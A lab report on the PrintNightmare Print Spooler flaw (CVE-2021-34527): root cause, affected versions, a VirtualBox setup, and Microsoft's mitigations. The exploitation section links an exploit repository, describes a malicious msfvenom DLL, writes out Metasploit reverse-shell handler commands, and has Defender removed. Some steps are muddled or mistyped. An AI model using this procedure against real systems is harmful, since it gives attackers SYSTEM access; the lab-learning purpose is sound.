**CVE-2021-34527 PRINT NIGHTMARE**

Contents

[INTRODUCTION ](#_Toc162856150)

[DOCUMENTATION ](#_Toc162856151)

[Technical Details ](#_Toc162856152)

[Outcome ](#_Toc162856153)

[Exploiting the vulnerability (setup environment and Exploitation) ](#_Toc162856154)

[Setting Windows Server 2016 (Target Machine) ](#_Toc162856155)

[Setting Kali Linux (Attacking Machine) ](#_Toc162856156)

[Exploitation ](#_Toc162856157)

[Result: ](#_Toc162856158)

[MITIGATION AND PREVENTION STRATEGIES ](#_Toc162856159)

[CONCLUSION ](#_Toc162856160)

[REFERENCE ](#_Toc162856161)

# INTRODUCTION

Considering the intricate nature of cybersecurity, attacks might appear out of the blue from unexpected places. The recent discovery of the "Print Nightmare" vulnerability highlights how erratic these dangers can be. Microsoft released CVE-2021-34527 on Tuesday, July 6, 2021, addressing a vulnerability in the Windows Print Spooler.If the vulnerability is successfully exploited, the attacker will be able to run arbitrary code with SYSTEM access, installing applications, deleting or manipulating data, and creating new accounts with complete user rights. This vulnerability called "PrintNightmare" within the Windows Print Spooler service permits both Remode code execution (RCE) and Local privilege execution(LPE).

In this report we will delve into the details surrounding the CVE-2021-34527, the technical specifications, exploitation result and impacted systems and the suggested courses of action to lessen the related hazards.

# DOCUMENTATION

## Technical Details

CVE-2021-34527 is a remote code execution (RCE) vulnerability enabling remote injection on DLLS. This vulnerability is caused by a permission bypass vulnerability in the Print Spooler service (spoolsv.exe) of the Windows operating system.

A printer spooler is a crucial application responsible for managing print jobs sent from a computer to a printer. It enables the system to function as both print clients and print servers. However, a significant drawback of this service is that it is enabled by default and operates within the SYSTEM context, making it vulnerable to exploitation by attackers seeking privileged access to the system. This vulnerability is often exploited in domain controllers, particularly for printer pruning purposes. In this context, printers are treated as objects, and the pruning process involves removing printers that are published but no longer available on the network from the Active Directory (AD). This prevents users from attempting to print to printers that no longer exist, effectively resolving the issue of users attempting to print to non-existent printers.

Due to this vulnerability, authorized remote users can install print drivers by using the RpcAddPrinterDriver RPC function to specify a driver file that is located remotely. An individual with limited access privileges can exploit this vulnerability by creating and employing a malicious DLL file, thereby executing an exploit and acquiring SYSTEM level privileges in the Windows System.

To add a new printer using RPC protocols such as RpcAsyncAddPrinterDriver \[MS-PAR\] or RpcAddPrinterDriverEx \[MS-RPRN\], the client has to provide the Print Spooler service with some parameters such as:

1. pDataFile - refers to the file path for this printer
2. pConfigFile - represents the path to printer’s configuration file
3. pDriverPath - signifies the path to the driver file utilized by the printer during its operation.

To verify that pDataFile and pDriverPath do not utilize UNC paths, the service does many checks\[1\]. Nevertheless, pConfigFile does not provide an equivalent check, meaning that the service will transfer the configuration DLL to the designated location without performing a validity check. The print service will successfully load thus DLL of the Windows Prin Spooler setspDataFile to the location of the previously copied DLL during a future attempt to add a printer. This happens as a result of the validity check passing and the route not being a UNC path. Crucially, the DLL is loaded by the NT AUTHORITY\\SYSTEM group process, and these methods can be used with a low-privileged user. Consequently, code from an arbitrary DLL file is executed by the Print Spooler service (spoolsv.exe) with SYSTEM-level privileges.

## Outcome

The outcome includes that anyone who take advantage of this vulnerability may be able to access, alter, or remove sensitive data as well as perform tasks like installing applications or making new accounts.In addition, Every Windows-based system, including domain controllers and machines with system administrator credentials, the Windows Print Spooler is turned on by default. This means that every system is vulnerable to this flaw. This vulnerability has the potential to affect domain controllers located in business networks. Ransomware groups may use this weakness in the future, just like they do with other important vulnerabilities.This vulnerability affects 'all versions of Windows,' including different architectures and releases, according to Microsoft's study. The impacted versions are listed clearly in the following list.

- Windows Server 2008 SP2
- Windows Derver 2008 R2 SP1
- Windows Server 2012
- Windows Server 2012 R2
- Windows Server 2016,2019,1909,2004,20h2
- Windows 7 SP1
- Windows 8.1
- Windows RT 8.1
- Windows 10

The vulnerability is likely to affect unsupported versions of Windows, and Microsoft is unlikely to offer patches for these versions \[2\].

# Exploiting the vulnerability (setup environment and Exploitation)

Basically, we have to setup 2 machines. One machine is Kali Linux machine which is used an attacker machine and the second machine is Windows server 2016 which is used a target Machine

## Setting Windows Server 2016 (Target Machine)

Following are the requirement for setting up Windows Server

1. **Install Windows server 2016 in you virtual Box**: We need to set up a virtual environment using VirtualBox to run Windows Server 2016 as our target machine. Its IP is 192.168.100.78
2. **Set up domain controller:** We will now configure Windows Server 2016 to act as a domain controller within a network. Setting up a domain controller is essential for managing user accounts, security policies, and network resources in an Active Directory environment. Following are the steps to setup the domain controller \[6\]  

- Log into your Active Directory Server with administrative credentials
- Open Server Manager → Roles Summary → Add roles and features
- Select the installation type. We will choose Role-based or Feature-based installation.
- Now, select the destination server on which the role will be installed. Make sure the IP address points to the selected server. Else, close the server manager and retry.
- Select the roles you want to install on this server. The basic requirements to promote this server into a domain controller is Active Directory Domain Services
- Confirm your installation selections. It is recommended to select the "Restart the destination server automatically if required" button. Select "Install" and once installation is complete, close the window


1. **Set RPC**

We will need to configure Remote Procedure Call (RPC) services, which are essential for communication between networked computers in a Windows environment. Configuring RPC ensures that necessary services and applications can communicate effectively across the network.

1. **Add a new user to your group:** We will be adding a new user account to an existing group within the Windows Server 2016 environment.
2. **Remove windows defender:** We will need to disable the windows defender from the server manager so that shell.dll doesn’t get removed by defender. Following are the steps to disable the windows defender from the windows server

- Click on the Server Manager
- Go to Manage and click on Remove roles and features
- Untick the Windows Defender and click on Next. In the last step, click on the Remove button.

1. **Enabling the Print spooler services:** We will need to enable the Print Spool services from searching from services menu and enable that by right clicking on that service


## Setting Kali Linux (Attacking Machine)

Following are the requirement for setting up Kali Linux as an attacker machine

1. **Install Windows server 2016 in you virtual Box:** We need to set up a virtual environment using VirtualBox to run Kali Linux as our attacking machine. Its IP is 192.168.100.77
2. **Cloning the repository:** We will need to clone the repository from <https://github.com/nathanealm/PrintNightmare-Exploit> which contain python exploit code that will give us RCE (remote code execution)


1. **Installing specific version impacket:** Impacket is a set of Python classes designed to interact with network protocols. It emphasizes granting developers access to packets at a low level, along with offering protocol implementations for certain protocols such as SMB1-3 and MSRPC. We have to install specific version of impacket to make it compatible with our environment so we have to install it manually by clonning it from  
    **<https://github.com/cube0x0/impacket>**

## Exploitation

To exploit this vulnerability, the chosen delivery method is a malicious DLL. This approach, often termed as "File-less" exploitation, allows bypassing various system protections including antivirus software. The attack involves manipulating the print spooler service to install a new driver from a UNC path and subsequently loading the driver, which in this scenario is the malicious DLL. This action enables the attacker to establish a reverse shell to their machine, facilitating unauthorized access to the compromised system.

To craft the malicious DLL, I will utilize 'msfvenom'. Given our system architecture is Windows 64-bit, I'll integrate a Windows x64 payload into the DLL. This payload will include specifications for the LocalHost and LocalPort, which will be used to initiate a listener for receiving a callback from the DLL.

We have to start our Listener on the “Metasploit Framework” to get the ‘Meterpreter’ shell back when the DLL is executed on the system. To start the Listener follow the below steps.

Here are the details of each command to start the Listener on the Metasploit Framework:

1. **use exploit/multi/handler:** This command instructs Metasploit to utilize the specified exploit module, which is 'multi/handler'. The 'multi/handler' module is designed to handle connections from multiple types of payloads.


1. **set payload windows/x64/meterpreter/reverse_tcp**: This command sets the payload to be used by the handler. In this case, the payload is 'windows/x64/meterpreter/reverse_tcp', which indicates that a Meterpreter shell will be generated for Windows 64-bit systems and will establish a reverse TCP connection back to the attacker's machine.


1. **set LHOST eth0:** This command sets the Local Host (LHOST) parameter to specify the IP address of the network interface on the attacker's machine where the reverse shell connection will be received.


1. **\`run\`:** This command executes the listener with the specified settings. Once executed, the listener will be active and waiting for the reverse TCP connection from the malicious DLL. When the DLL is executed on the target system, it will attempt to establish a connection back to the specified IP address and port, allowing the attacker to gain a Meterpreter shell on the compromised system.


With the listener initiated, the next step is to set up an SMB server to host our malicious DLL file. Navigate to the directory where the DLL is stored and execute the following command to launch the SMB server:


Wow we have already set up everything you could start the exploitation process using the CVE-2021–34527 POC by providing the domain controller and user credentials with the UNC path for the hosted malicious DLL on our system.


## Result

Attained NT Authority\\SYSTEM privileges on our target machine, which represents the highest level of access on a local Windows instance. Thus concisely highlighting the critical elements of the vulnerability. An attacker can install malware and other dangerous software on the system after effectively exploiting CVE-2021-34527. This gives them the potential to conduct more assaults or utilize the hacked system as a springboard for other network-wide offensives.


# MITIGATION AND PREVENTION STRATEGIES

Here is some possible guidance provided by Microsoft to protect against PrintNightmare vulnerability.

1. **Install updates :** Install the applicable patches released by Microsoft to remedy the identified vulnerabilities.
2. **Disable the Print Spooler service:** Domain controllers and Active Directory admin system need to deactivate the Windows Printer Spooler service on the system. This action will result in the cessation of both local and remote printing capabilities. However, it will also hinder the execution of printing jobs.
3. **OOB security update:** Altering the default registry setting associated with Point and Print to an insecure configuration.

If the documented registry keys are present, it is crucial for system security to verify that the specified registry keys are either set to 0 (zero) or are absent:

- HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint
- NoWarningNoElevationOnInstall = 0 (DWORD) or not defined (default setting)
- UpdatePromptSettings = 0 (DWORD) or not defined (default setting)

1. **Modify the user privilege of System:** In order to prevent writing in the %SYSTEM%\\System32\\spool\\drivers\\ directory, change the user rights on the system. The purpose of this change in user rights is to stop possible attackers' Windows executables and DLLs from being installed\[3\].
2. **0Patch :** Unlike Microsoft, which finds and replaces vulnerable libraries, this patch from 0Patch targets vulnerabilities directly in RAM memory and provides micro-patches for bug fixes.
3. **Group Policy:** To thwart potential remote attacks, disable the ‘Allow Print Spooler to accept client connections’ option, blocking inbound printing processes through group policy.
4. **Endpoint security solution:** They are quite successful in stopping hostile actors from exploiting devices such as laptops, mobile devices, and desktop computers.

# CONCLUSION

CVE-2021-34527 emphasizes how important it is to address security flaws as soon as possible in order to reduce the chance of exploitation and the harm that results. This vulnerability serves as a warning that, if neglected, even seemingly little flaws can have serious consequences. To guarantee the safety and security of digital systems, cooperation between security experts, software providers, and end users is crucial. We can maintain the integrity of our digital systems and proactively prevent such situations in the future by being aware, putting best practices into practice, and swiftly correcting vulnerabilities.

# REFERENCE

1. \[1\]Kaspersky et al., “Quick look at CVE-2021-1675 & CVE-2021-34527 (AKA PrintNightmare),” Securelist English Global securelistcom, <https://securelist.com/quick-look-at-cve-2021-1675-cve-2021-34527-aka-printnightmare/103123/> (accessed Mar. 2, 2024).
2. \[2\]Gil, “Printnightmare CVE-2021-34527,” Cyberint, <https://cyberint.com/blog/research/cve-2021-34527-printnightmare-vulnerability/> (accessed Mar. 2, 2024).
3. \[3\]Cyavatar,“Printnightmare: Critical windows print spooler RCE vulnerability,” CYVATAR.AI, <https://cyvatar.ai/printnightmare-rce-vulnerability/> (accessed Mar. 2, 2024).
4. \[4\]CVE 2021-1675 & CVE-2021-34527 PrintNightmare ..., <https://www.exploit-db.com/docs/50537> (accessed Mar. 2, 2024).
5. \[5\]Nemo-Wq, “Nemo-WQ/Printnightmare-CVE-2021-34527: Printnightmare - Windows Print Spooler RCE/LPE vulnerability (CVE-2021-34527, CVE-2021-1675) proof of concept exploits,” GitHub, <https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527?tab=readme-ov-file> (accessed Mar. 2, 2024).
6. \[6\]<https://www.manageengine.com/products/active-directory-audit/kb/how-to/how-to-setup-a-domain-controller.html>

<br/>
